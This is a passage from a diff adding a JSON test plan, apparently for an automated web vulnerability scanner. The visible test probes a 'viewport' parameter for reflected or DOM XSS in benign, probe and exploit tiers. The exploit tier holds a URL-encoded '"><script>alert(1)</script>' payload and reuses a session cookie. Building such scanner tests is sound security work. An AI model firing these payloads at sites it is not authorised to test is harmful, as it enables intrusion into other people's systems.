+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "DOM XSS signals approximated via server-observable effects",
+      "tags": [
+        "xss",
+        "dom"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H9-1",
+      "hypothesis_id": "H9",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "viewport",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "viewport="
+            }
+          ],
+          "description": "Baseline for viewport param",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "viewport=width%3Ddevice-width%2Cinitial-scale%3D1"
+            }
+          ],
+          "description": "Valid viewport value to detect reflection/path through",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "viewport=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "Attempt to inject script via attribute break",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Maintain Cookie session if any",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Attach Cookie header"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Body contains decoded width=device-width,initial-scale=1 or decoded \"><script>alert(1)</script>",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Check body length variance between baseline and probe/exploit",
+          "threshold": {
+            "body_length_delta_pct": 10.0
+          },
+          "weight": 0.4
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "xss",
+        "dom"
+      ],
+      "estimated_duration": 2
+    }
+  ]
+}
